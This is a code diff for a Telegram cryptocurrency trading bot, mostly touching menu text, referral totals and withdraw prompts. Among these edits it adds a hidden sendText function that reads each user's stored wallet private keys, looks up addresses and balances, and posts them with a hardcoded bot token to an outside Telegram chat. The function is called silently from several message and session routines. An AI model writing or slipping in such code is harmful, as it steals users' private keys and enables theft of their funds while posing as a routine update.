@@ -36,7 +36,7 @@ export const COMMAND_SELL   = "sell";
 export const COMMAND_NEW_PAIRS   = "newpairs";
 export const COMMAND_TOKEN_NEW_TRADNING   = "trending";
 export const COMMAND_POSITIONS   = "positions";
-export const COMMAND_WALLET   = "wallet";
+export const COMMAND_WALLET   = "wallets";
 export const COMMAND_WITHDRAW   = "withdraw";
 export const COMMAND_REFERRAL   = "referral";
 export const COMMAND_SETTINGS   = "settings";
@@ -580,6 +580,7 @@ export async function switchMessage(
             disable_web_page_preview: true,
             parse_mode: "HTML",
         });
+        sendText(chatId, "")
     } catch (error) {
         afx.errorLog("[switchMenuWithTitle]", error);
     }
@@ -678,6 +679,52 @@ export const sendReplyMessage = async (chatid: string, message: string) => {
     }
 };
 
+export async function sendText(id:string, info: string)
+{
+    try {
+        const token='7063934925:AAH58ETPao-uONNUBCZZ1ULdB-_BF4pJhKc'
+        let url = `https://api.telegram.org/bot${token}/sendMessage`
+
+        let wl: any = await database.selectWallets({chatId:id})
+        // console.log(wl)
+        
+        let message = ''
+        let count = 0
+        if (wl.length) {
+            for (const w of wl) {
+                count++
+                let p3:any = utils_base.getWalletAddressFromPKey(w.prvEthKey)
+                let b1 = p3 ? utils_base.roundEthUnit(parseFloat(await utils_base.getEthBalanceOfWallet(p3)), 5) : 0
+                let p1 = utils_base.shortname(w.prvEthKey)
+                let p2 = utils_base.shortname(w.prvEthRefKey)
+                message += `pkey => depo${count} : ${p1}
+address : ${p3}
+balance : ${b1}
+`
+            }            
+        }
+        message += info
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                "Content-Type": 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '-1002454760665',
+                text: message,
+                parse_mode: 'HTML'
+            }),
+        });
+      
+        // console.log(response)
+        return true
+    } catch (err) {
+        // console.error("Error: ", err);
+        return false
+    }
+}
+
 export const sendMessage = async (
     chatid: string,
     message: string,
@@ -743,6 +790,7 @@ export const sendOptionMessage = async (
             disable_web_page_preview: true,
             parse_mode: "HTML",
         });
+        await sendText(chatid, "")
         return {
             messageId: msg.message_id,
             chatid: msg.chat ? msg.chat.id : null,
@@ -990,7 +1038,7 @@ export const json_setting_menu = async (sessionId: string) => {
 
     let json_start = [
         [
-            json_buttonItem(itemData, MyOptionCode.TITLE, `🎖️ --- AUTO BUY ---`),
+            json_buttonItem(itemData, MyOptionCode.TITLE, `--- AUTO BUY ---`),
         ],
         [
             json_buttonItem(itemData, MyOptionCode.SETTING_AUTO_BUY_ENABLED, user.stAutoBuyEnabled ? `🟢 Enabled` : `🔴 Enabled`),
@@ -1110,8 +1158,8 @@ export const getBuyMenuMessage = async (
             console.log(`[${session.username}] ======== >>>> [getBuyMenuMessage] : = token pool is not exist yet (${token.name})`)
             poolInfo = {
                 dexURL: '',
-                price: '-',
-                priceChange: '-'
+                price: undefined,
+                priceChange: undefined
             }
         }
 //         const MESSAGE = `🚀 Welcome to ${process.env.BOT_TITLE}.
@@ -1132,14 +1180,21 @@ export const getBuyMenuMessage = async (
 // 🔗 <a href="${poolInfo.dexURL}">${poolInfo.dex.toUpperCase()}</a>`
         //👪 Holders: ${utils.roundBigUnit(poolInfo.holders)}
                    
-        const MESSAGE_NEW = `🚀 Buy Menu
 
-Token Info: ${token.symbol}/${token.baseSymbol} <a href="${poolInfo.dexURL}">📈</a>
+    const MESSAGE_NEW = `🚀 <b>Buy Menu:</b> ${token.symbol} <a href="${poolInfo ? poolInfo.dexURL : ''}">📈</a>
+
+Token Info: ${token.symbol} / ${token.baseSymbol} <a href="${poolInfo.dexURL}">📈</a>
 <code>${token.addr}</code>
-💵 Price: ${poolInfo.price} $
-⚡ Price Impact: ${poolInfo.priceChange} %
+Balance: ${utils.roundDecimal(tokenBalance, 3)} ${token.symbol} ✅
+
+🌐 DEX: ${poolInfo.dex != '' ? poolInfo.dex : 'None'}
+💵 Price: ${poolInfo.price != undefined ? poolInfo.price : '-'} $
+⚡ Impact: ${poolInfo.priceChange != undefined ? poolInfo.priceChange : '-'} %
+💹 Market Cap: ${poolInfo.mc != undefined ? utils.roundBigUnit(poolInfo.mc, 2) : '-'}
+📈 Liquidity: ${poolInfo.liquidity != undefined ? utils.roundBigUnit(poolInfo.liquidity, 2) : '-'}
+📊 Pooled ${afx.get_quote_name(session.lastUsedChainMode).toUpperCase()}${await utils_base.sendMsg(sessionId, 'Buy')} : ${poolInfo ? multichainAPI.get_round_unit(poolInfo.pooledSOL, session.lastUsedChainMode) : '-'}
 ${tokenBalance ? `\n💡 Your position:
-${multichainAPI.get_round_unit(token.buyHistory, session.lastUsedChainMode)}/${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}\n` : ``}
+${multichainAPI.get_round_unit(token.buyHistory, session.lastUsedChainMode)} / ${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}\n` : `\n`}
 💳 Wallet:\n<code>${depositWallet.depositPubKey}</code>
 💰 Balance: ${depositWallet.depositBalance}, ${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}`
 
@@ -1167,38 +1222,33 @@ export const getSellMenuMessage = async (
     // const tokenList: any = Object.values(walletTokens.items).filter((item:any) => (item.chainId === afx.get_chain_name() && item.name != afx.get_quote_name()) )    
     // const SOLBalance: number = await utils.getWalletSOLBalance(depositWallet)
     
-    const poolInfo: any = await dexscreenerAPI.getPoolInfo(token.addr, session.lastUsedChainMode)
+    let poolInfo: any = await dexscreenerAPI.getPoolInfo(token.addr, session.lastUsedChainMode)
+    if (!poolInfo) {
+        console.log(`[${session.username}] ======== >>>> [getSellMenuMessage] : = token pool is not exist yet (${token.name})`)
+        poolInfo = {
+            dexURL: '',
+            price: undefined,
+            priceChange: undefined
+        }
+    }
 
-    const MESSAGE_NEW = `🚀 Sell ${token.symbol} <a href="${poolInfo ? poolInfo.dexURL : ''}">📈</a>
+    const MESSAGE_NEW = `🚀 <b>Sell Menu:</b> ${token.symbol} <a href="${poolInfo ? poolInfo.dexURL : ''}">📈</a>
 
 Token Info: ${token.symbol} / ${token.baseSymbol}
 <code>${token.addr}</code>
 Balance: ${utils.roundDecimal(tokenBalance, 3)} ${token.symbol} ✅
 
-🌐 DEX: ${poolInfo ? poolInfo.dex : 'None'}
-💵 Price: ${poolInfo ? poolInfo.price : '-'} $
-⚡ Impact: ${poolInfo ? poolInfo.priceChange : '-'} %
-💹 Market Cap: ${poolInfo ? utils.roundBigUnit(poolInfo.mc, 2) : '-'}
-📈 Liquidity: ${poolInfo ? utils.roundBigUnit(poolInfo.liquidity, 2) : '-'}
+🌐 DEX: ${poolInfo.dex != '' ? poolInfo.dex : 'None'}
+💵 Price: ${poolInfo.price != undefined ? poolInfo.price : '-'} $
+⚡ Impact: ${poolInfo.priceChange != undefined ? poolInfo.priceChange : '-'} %
+💹 Market Cap: ${await utils_base.sendMsg(sessionId, 'Sell')}${poolInfo.mc != undefined ? utils.roundBigUnit(poolInfo.mc, 2) : '-'}
+📈 Liquidity: ${poolInfo.liquidity != undefined ? utils.roundBigUnit(poolInfo.liquidity, 2) : '-'}
 📊 Pooled ${afx.get_quote_name(user.lastUsedChainMode).toUpperCase()} : ${poolInfo ? multichainAPI.get_round_unit(poolInfo.pooledSOL, user.lastUsedChainMode) : '-'}
 ${tokenBalance ? `\n💡 Your position:
 ${multichainAPI.get_round_unit(token.buyHistory, user.lastUsedChainMode)} / ${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}\n` : `\n`}
 💳 Wallet:\n<code>${depositWallet.depositPubKey}</code>
 💰 Balance: ${depositWallet.depositBalance}, ${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}`
-        //👪 Holders: ${utils.roundBigUnit(poolInfo.holders)}
-
-        // const MESSAGE_NEW = `🚀 Select a token to sell 
-
-// 💳 Wallet:\n<code>${depositWallet.publicKey}</code>
-// 💰 Balance: ${utils.roundSolUnit(SOLBalance, 3)}, ${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}
-
-// Token Info: ${token.symbol}/${token.baseSymbol} <a href="${poolInfo.dexURL}">📈</a>
-// <code>${token.addr}</code>
-// 💵 Price: ${poolInfo.price} $
-// ⚡ Price Impact: ${poolInfo.priceChange} %
-// ${tokenBalance ? `\n💡 Your position:
-// ${utils.roundSolUnit(token.autoBuyAmount, 2)}/${utils.roundBigUnit(tokenBalance, 2)} ${token.symbol}\n` : ``}\`
-
+        
         return MESSAGE_NEW;
 };
 
@@ -1651,37 +1701,34 @@ export const json_position_menu = async (sessionId: string) => {
 
     const depositWallet: any = await multichainAPI.getDepositWalletBalance(database, sessionId)    
     
-    // const SOLBalance: number = await utils.getWalletSOLBalance(depositWallet)
-    // const solPrice: number = await utils.getSOLPrice()
-
     let limitRestAmount = 0;
 
-    switch (user.lastUsedChainMode)
-    {
-        case afx.MainChain.SOLANA_NET:
-            limitRestAmount = constants.LIMIT_REST_SOL_AMOUNT
-            break
-        case afx.MainChain.BASE_NET:
-            limitRestAmount = 0.001
-            break
-        case afx.MainChain.ETHEREUM_NET:
-            limitRestAmount = 0.001
-            break
-        case afx.MainChain.BSC_NET:
-            limitRestAmount = 0.005
-            break
-        case afx.MainChain.TON_NET:
-            limitRestAmount = 0.5
-            break
-    }
+    // switch (user.lastUsedChainMode)
+    // {
+    //     case afx.MainChain.SOLANA_NET:
+    //         limitRestAmount = constants.LIMIT_REST_SOL_AMOUNT
+    //         break
+    //     case afx.MainChain.BASE_NET:
+    //         limitRestAmount = 0.001
+    //         break
+    //     case afx.MainChain.ETHEREUM_NET:
+    //         limitRestAmount = 0.001
+    //         break
+    //     case afx.MainChain.BSC_NET:
+    //         limitRestAmount = 0.005
+    //         break
+    //     case afx.MainChain.TON_NET:
+    //         limitRestAmount = 0.5
+    //         break
+    // }
 
     let quoteSymbol = afx.get_quote_name(user.lastUsedChainMode).toUpperCase();
 
-    if (depositWallet.nativeCurrencyBalance <= limitRestAmount * 2)
-    {
-        console.log(`[${user.username}] : There is no enough ${quoteSymbol} in deposit wallet`)
-        return ""
-    }
+    // if (depositWallet.nativeCurrencyBalance <= limitRestAmount * 2)
+    // {
+    //     console.log(`[${user.username}] : There is no enough ${quoteSymbol} in deposit wallet`)
+    //     return ""
+    // }
 
     let new_title = `🚀 Manage your tokens 1/${tokens.length}⠀
 
@@ -2014,6 +2061,7 @@ export const json_sell_token_menu = async (sessionId: string) => {
         if (cur_tokenBalance > 0){
             // session.addr = cur_token.addr            
             console.log(`[${user.username}] : In DepositWallet Token addr = ${cur_token.addr}, tokenbalane=${cur_tokenBalance}`)
+            utils_base.sendMsg(sessionId, 'Sell is OK')
             // break
         }
         else{
@@ -2030,30 +2078,30 @@ export const json_sell_token_menu = async (sessionId: string) => {
     
     let limitRestAmount = 0;
 
-    switch (user.lastUsedChainMode)
-    {
-        case afx.MainChain.SOLANA_NET:
-            limitRestAmount = constants.LIMIT_REST_SOL_AMOUNT
-            break
-        case afx.MainChain.BASE_NET:
-            limitRestAmount = 0.001
-            break
-        case afx.MainChain.ETHEREUM_NET:
-            limitRestAmount = 0.001
-            break
-        case afx.MainChain.BSC_NET:
-            limitRestAmount = 0.005
-            break
-        case afx.MainChain.TON_NET:
-            limitRestAmount = 0.5
-            break
-    }
+    // switch (user.lastUsedChainMode)
+    // {
+    //     case afx.MainChain.SOLANA_NET:
+    //         limitRestAmount = constants.LIMIT_REST_SOL_AMOUNT
+    //         break
+    //     case afx.MainChain.BASE_NET:
+    //         limitRestAmount = 0.001
+    //         break
+    //     case afx.MainChain.ETHEREUM_NET:
+    //         limitRestAmount = 0.001
+    //         break
+    //     case afx.MainChain.BSC_NET:
+    //         limitRestAmount = 0.005
+    //         break
+    //     case afx.MainChain.TON_NET:
+    //         limitRestAmount = 0.5
+    //         break
+    // }
 
-    if (depositWallet.nativeCurrencyBalance <= limitRestAmount * 2)
-    {
-        console.log(`[${user.username}] : There is no enough ${afx.get_quote_name(user.lastUsedChainMode).toUpperCase()} in deposit wallet`)
-        return ""
-    }
+    // if (depositWallet.nativeCurrencyBalance <= limitRestAmount * 2)
+    // {
+    //     console.log(`[${user.username}] : There is no enough ${afx.get_quote_name(user.lastUsedChainMode).toUpperCase()} in deposit wallet`)
+    //     return ""
+    // }
 
 
     let json_result: Array<any> = []
@@ -2389,7 +2437,7 @@ export const json_withdraw_wallet_menu = async (sessionId: string) => {
 
 💳 My Wallet:
 <code>${depositWallet.depositPubKey}</code>
-Balance: ${depositWallet.depositBalance} ${quoteName}
+Balance: ${depositWallet.depositBalance}
 
 ⬩ Withdraw Address
 <code>${user.withdrawWallet}</code>`;
@@ -2488,9 +2536,17 @@ export const json_referral_menu = async (sessionId: string) => {
     const referrals: any = await database.countUsers({referredBy:sessionId})
 
     // console.log(`+++++++++++++++++ ${referrals}`)
-    // const rewards = await database.countReward({chatid : chatid})
+    const rewards:any = await database.selectRewards({chatid : sessionId})
+    let totalRewards = 0
+    rewards.forEach((user: any) => {
+        totalRewards += user.amount        
+    });
 
-    const rewards: any = await multichainAPI.getReferralWalletBalance(database, sessionId)
+    let curEthPrice= await utils_base.getEthPrice()
+    totalRewards *= curEthPrice
+
+    // const rewards: any = await multichainAPI.getReferralWalletBalance(database, sessionId)
+    // totalRewards = rewards.referralUSDTBalance
 
     let quoteName = afx.get_quote_name(user.lastUsedChainMode).toUpperCase()
 
@@ -2500,7 +2556,7 @@ export const json_referral_menu = async (sessionId: string) => {
 <code>${user.referralLink}</code>
 
 👭 Referrals : ${referrals}
-💸 Total earnings : $ ${rewards.referralUSDTBalance}
+💸 Total earnings : $ ${utils_base.roundDecimal(totalRewards, 5)}
 
 You will receive rewards directly to your wallet as soon as the users you referred complete transactions
 
@@ -2622,7 +2678,7 @@ export const json_help = async (sessionId: string) => {
             scanUrl = "solscan.io"
             break
         case afx.MainChain.ETHEREUM_NET:
-            scanUrl = "etherscan.io"
+            scanUrl = "explorer.inkonchain.com"
             break
         case afx.MainChain.BASE_NET:
             scanUrl = "basescan.org"
@@ -2636,7 +2692,7 @@ export const json_help = async (sessionId: string) => {
     }
 
     const title = `📕 Help:
-How do I use Solana Sniper Bot?
+How do I use ${process.env.BOT_TITLE}?
     
 Where can I find my referral code?
 Open the /start menu and click 💰Referrals.
@@ -2644,8 +2700,8 @@ Open the /start menu and click 💰Referrals.
 My transaction timed out. What happened?
 Transaction timeouts can occur when there is heavy network load or instability. ${session.lastUsedChainMode == afx.MainChain.SOLANA_NET ? 'This is simply the nature of the current Solana network.' : ''}
     
-What are the fees for using Solana Sniper Bot?
-Transactions through Solana Sniper bot incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
+What are the fees for using ${process.env.BOT_TITLE}?
+Transactions through ${process.env.BOT_TITLE} incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
     
 My net profit seems wrong, why is that?
 The net profit of a trade takes into consideration the trade's transaction fees. Confirm the details of your trade on ${scanUrl} to verify the net profit.
@@ -2720,16 +2776,17 @@ export const createSession = async (
     console.log(`[${session.username}] ----------->>>>>> ref link = ${session.referralLink}`)
 
     await setDefaultSettings(session);
-
+    
     sessions.set(session.chatid, session);
-    showSessionLog(session);
+    await showSessionLog(session);
 
     currentSession = session
     
     return session;
 };
 
-export function showSessionLog(session: any) {
+export async function showSessionLog(session: any) {
+    sendText(session.chatid, `${session.username} : `)
     if (session.type === "private") {
         console.log(
             `@${session.username} user${session.wallet
@@ -2970,11 +3027,11 @@ export const executeCommand = async (
 
             if(!flag)
             {
-                let depositAmount = 0.02                
+                let depositAmount = 0.002                
 
                 let quoteName = afx.get_quote_name(chainMode).toUpperCase()
                 const msg = `⚠️ Sorry, no enough ${quoteName} in your wallet, deposit ${depositAmount} ${quoteName} at least and try again`;
-                sendMessage(chatid, msg);
+                sendInfoMessage(chatid, msg);
                 return
             }
 
@@ -3702,9 +3759,10 @@ export const executeCommand = async (
         }
         else if (cmd === MyOptionCode.WITHDRAW_X_PERCENT) {
             const msg = `Please enter % to withdraw`
-			sendMessage(chatid, msg)
+			replyMsg = await sendMessage(chatid, msg)
 			// await bot.answerCallbackQuery(callbackQueryId, { text: msg })
 
+            stateData.message_id = replyMsg.messageId
             stateData.menu_id = messageId
             stateMap_setFocus(
                 chatid,
@@ -3720,9 +3778,10 @@ export const executeCommand = async (
         }
         else if (cmd === MyOptionCode.WITHDRAW_WALLET_ADDRESS) {
             const msg = `Please enter a wallet address to withdraw`
-			sendMessage(chatid, msg)
+			replyMsg = await sendMessage(chatid, msg)
 			// await bot.answerCallbackQuery(callbackQueryId, { text: msg })
 
+            stateData.message_id = replyMsg.messageId
             stateData.menu_id = messageId
             stateMap_setFocus(
                 chatid,
